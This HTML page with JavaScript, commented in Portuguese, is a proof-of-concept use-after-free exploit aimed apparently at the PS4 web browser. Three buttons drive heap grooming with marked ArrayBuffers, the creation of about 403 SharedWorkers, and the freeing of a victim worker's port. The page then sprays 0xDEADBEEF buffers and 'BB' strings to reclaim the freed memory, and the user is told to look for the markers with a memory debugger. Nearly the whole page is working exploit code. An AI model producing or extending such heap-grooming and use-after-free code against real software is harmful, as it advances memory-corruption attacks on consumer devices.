<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 DEBUG INSPECTOR</title>
    
</head>
<body>

    <h1>DEBUGGER MEMORY INSPECTOR</h1>
    <h3>Use o PS4Debug/Reaper para acompanhar</h3>

    <button onclick="step1_groom()">1. PREPARAR HEAP (0x11111111)</button>
    <button onclick="step2_victim()">2. CRIAR VÍTIMA (Worker 403)</button>
    <button onclick="step3_attack()">3. MATAR E INJETAR (0xDEADBEEF)</button>

    <div id="log">Aguardando comando...</div>

    <script>
        function log(msg) {
            document.getElementById("log").innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // VARIÁVEIS GLOBAIS
        var workers = [];
        var grooming_spray = [];
        var victim_worker = null;
        var victim_port = null;

        // TAMANHO ALVO (0xA0 - 160 bytes)
        // Vamos usar ArrayBuffer para desenhar na memória de forma limpa
        const SIZE = 0xA0; 

        // ==============================================================
        // PASSO 1: GROOMING
        // ==============================================================
        function step1_groom() {
            log("Enchendo a memória com 0x11111111...");
            
            // Cria buffers marcados para você achar a região do Heap no Debugger
            for(let i=0; i<1000; i++) {
                let buf = new ArrayBuffer(SIZE);
                let view = new Uint32Array(buf);
                view.fill(0x11111111);
                grooming_spray.push(buf);
            }
            
            // Cria workers de base (até 380)
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "base"+i)); } catch(e){}
            }
            
            log("HEAP PRONTO. Procure por 11 11 11 11 no Reaper.");
            alert("Pode escanear a memória agora (Busque 0x11111111).");
        }

        // ==============================================================
        // PASSO 2: VÍTIMA
        // ==============================================================
        function step2_victim() {
            log("Criando Workers até a zona de pressão (403)...");
            
            // Sobe até 403
            var current = 380;
            var it = setInterval(() => {
                if(current >= 403) {
                    clearInterval(it);
                    
                    // O último é a vítima
                    victim_worker = workers[workers.length - 1];
                    victim_port = victim_worker.port;
                    
                    log("VÍTIMA CRIADA (Worker 403).");
                    log("Este objeto está agora alocado no Heap.");
                    alert("Worker Criado. O objeto está vivo na memória.");
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+current);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                current++;
            }, 50);
        }

        // ==============================================================
        // PASSO 3: ATAQUE (UAF)
        // ==============================================================
        function step3_attack() {
            if(!victim_worker) return alert("Crie a vítima primeiro!");
            
            log("Liberando Worker e Spraying 0xDEADBEEF...");

            // 1. FREE
            victim_worker.port.close();
            victim_worker = null;

            // 2. SPRAY (Tentativa de Reclaim)
            // Usamos ArrayBuffer primeiro (Zona B)
            var attack_spray = [];
            for(let k=0; k<5000; k++) {
                let buf = new ArrayBuffer(SIZE);
                let view = new Uint32Array(buf);
                view.fill(0xDEADBEEF); // Marcador de Sucesso
                attack_spray.push(buf);
            }
            
            // Usamos também Strings (Zona A - Mais provável para Worker)
            // String de 0xA0 bytes contendo "B" (0x42)
            // 160 bytes - header = ~130 chars
            var str_payload = "";
            for(let x=0; x<80; x++) str_payload += "BB"; // 0x4242
            
            var str_spray = [];
            for(let k=0; k<10000; k++) {
                str_spray.push(str_payload + k);
            }

            log("Spray concluído.");
            log("1. Procure por 0xDEADBEEF no Reaper.");
            log("2. Procure por 0x42424242 ('BBBB') no Reaper.");
            alert("Memória corrompida (teoricamente). Pause o processo e busque os marcadores.");
            
            // Teste final de acesso
            setTimeout(() => {
                try { victim_port.postMessage("CHECK"); } catch(e){}
            }, 2000);
        }

    </script>
</body>
</html>
